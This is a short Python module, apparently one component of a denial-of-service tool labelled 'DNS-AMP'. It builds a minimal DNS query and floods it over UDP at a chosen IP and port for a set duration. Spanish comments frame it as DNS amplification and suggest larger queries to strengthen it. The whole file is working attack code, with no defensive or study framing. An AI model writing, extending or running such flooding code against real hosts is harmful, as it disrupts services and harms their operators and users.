import socket
import time

def build_dns_payload():
    # Consulta DNS mínima con posibilidad de amplificación (tipo A, clase IN)
    # Este ejemplo es muy básico, puedes mejorar con queries más grandes
    transaction_id = b'\x00\x00'
    flags = b'\x00\x00'
    questions = b'\x00\x01'
    answer_rrs = b'\x00\x00'
    authority_rrs = b'\x00\x00'
    additional_rrs = b'\x00\x00'
    qname = b'\x00'  # dominio raíz
    qtype = b'\x00\x01'  # tipo A
    qclass = b'\x00\x01'  # clase IN
    return transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + qname + qtype + qclass

def run(ip, port, duration, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = build_dns_payload()
    end_time = time.time() + duration

    try:
        while not stop_event.is_set() and time.time() < end_time:
            sock.sendto(payload, (ip, port))
            time.sleep(0.001)
    except Exception as e:
        print(f"[DNS-AMP Error] {e}")
    finally:
        sock.close()

